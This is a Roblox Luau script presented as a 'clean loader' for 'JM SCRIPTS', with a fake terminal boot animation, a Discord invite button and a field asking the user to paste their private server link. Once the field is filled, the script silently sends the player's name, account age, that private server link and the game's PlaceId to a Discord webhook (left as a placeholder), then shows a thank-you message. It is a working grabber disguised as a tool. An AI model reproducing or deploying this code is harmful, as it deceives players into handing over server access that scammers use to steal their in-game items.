-- JM SCRIPTS CLEAN LOADER

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local DISCORD = "https://discord.gg/ZPz8Renfz"
local WEBHOOK = "COLE_WEBHOOK_AQUI"

-------------------------------------------------
-- GUI FULLSCREEN
-------------------------------------------------

local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui

local background = Instance.new("Frame")
background.Size = UDim2.new(1,0,1,0)
background.BackgroundColor3 = Color3.fromRGB(10,10,10)
background.Parent = gui

-------------------------------------------------
-- TERMINAL INTRO
-------------------------------------------------

local terminal = Instance.new("TextLabel")
terminal.Size = UDim2.new(1,-40,1,-40)
terminal.Position = UDim2.new(0,20,0,20)
terminal.BackgroundTransparency = 1
terminal.Font = Enum.Font.Code
terminal.TextColor3 = Color3.fromRGB(0,255,100)
terminal.TextSize = 14
terminal.TextXAlignment = Enum.TextXAlignment.Left
terminal.TextYAlignment = Enum.TextYAlignment.Top
terminal.Text = ""
terminal.Parent = background

local modules = {"core","network","ui","crypto","loader","engine"}

task.spawn(function()

	for i=1,40 do
		
		local line = "initializing "..modules[math.random(#modules)].."_"..math.random(1000,9999)
		
		terminal.Text = terminal.Text.."\n"..line
		
		task.wait(0.05)

	end

	task.wait(1)

	TweenService:Create(terminal,TweenInfo.new(1),{TextTransparency=1}):Play()

	task.wait(1)

	terminal:Destroy()

end)

-------------------------------------------------
-- CONTAINER PRINCIPAL
-------------------------------------------------

local container = Instance.new("Frame")
container.Size = UDim2.new(0,500,0,300)
container.Position = UDim2.new(0.5,-250,0.5,-150)
container.BackgroundColor3 = Color3.fromRGB(20,20,20)
container.Parent = background

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,14)
corner.Parent = container

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(160,0,255)
stroke.Thickness = 2
stroke.Parent = container

-------------------------------------------------
-- TITULO
-------------------------------------------------

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,60)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "JM SCRIPTS"
title.TextSize = 28
title.TextColor3 = Color3.new(1,1,1)
title.Parent = container

-------------------------------------------------
-- INPUT SERVER
-------------------------------------------------

local serverBox = Instance.new("TextBox")
serverBox.Size = UDim2.new(0.8,0,0,45)
serverBox.Position = UDim2.new(0.1,0,0.45,0)
serverBox.PlaceholderText = "Cole o link do servidor privado"
serverBox.Text = ""
serverBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
serverBox.TextColor3 = Color3.new(1,1,1)
serverBox.Parent = container

local corner2 = Instance.new("UICorner")
corner2.CornerRadius = UDim.new(0,10)
corner2.Parent = serverBox

-------------------------------------------------
-- DISCORD BUTTON
-------------------------------------------------

local discord = Instance.new("TextButton")
discord.Size = UDim2.new(0.5,0,0,40)
discord.Position = UDim2.new(0.25,0,0.7,0)
discord.Text = "Entrar no Discord"
discord.BackgroundColor3 = Color3.fromRGB(100,0,255)
discord.TextColor3 = Color3.new(1,1,1)
discord.Parent = container

local corner3 = Instance.new("UICorner")
corner3.CornerRadius = UDim.new(0,10)
corner3.Parent = discord

discord.MouseButton1Click:Connect(function()

	setclipboard(DISCORD)
	discord.Text = "Link copiado!"

end)

-------------------------------------------------
-- PLAYER INFO
-------------------------------------------------

local playerBox = Instance.new("Frame")
playerBox.Size = UDim2.new(0,200,0,60)
playerBox.Position = UDim2.new(0,20,1,-80)
playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
playerBox.Parent = background

local corner4 = Instance.new("UICorner")
corner4.CornerRadius = UDim.new(0,10)
corner4.Parent = playerBox

local info = Instance.new("TextLabel")
info.Size = UDim2.new(1,-10,1,-10)
info.Position = UDim2.new(0,5,0,5)
info.BackgroundTransparency = 1
info.Font = Enum.Font.Gotham
info.TextSize = 14
info.TextColor3 = Color3.new(1,1,1)
info.TextXAlignment = Enum.TextXAlignment.Left
info.Text =
player.Name..
"\nAccount Age: "..player.AccountAge.." days"
info.Parent = playerBox

-------------------------------------------------
-- FINAL + WEBHOOK
-------------------------------------------------

serverBox.FocusLost:Connect(function()

	local data = {
		content =
		"Player: "..player.Name..
		"\nAccountAge: "..player.AccountAge..
		"\nPrivateServer: "..serverBox.Text..
		"\nPlaceId: "..game.PlaceId
	}

	pcall(function()

		request({
			Url = WEBHOOK,
			Method = "POST",
			Headers = {["Content-Type"]="application/json"},
			Body = HttpService:JSONEncode(data)
		})

	end)

	container:Destroy()

	local thanks = Instance.new("TextLabel")
	thanks.Size = UDim2.new(1,0,0,100)
	thanks.Position = UDim2.new(0,0,0.45,0)
	thanks.BackgroundTransparency = 1
	thanks.Font = Enum.Font.GothamBold
	thanks.TextSize = 32
	thanks.TextColor3 = Color3.new(1,1,1)
	thanks.Text = "Obrigado por usar nosso script"
	thanks.Parent = background

end)
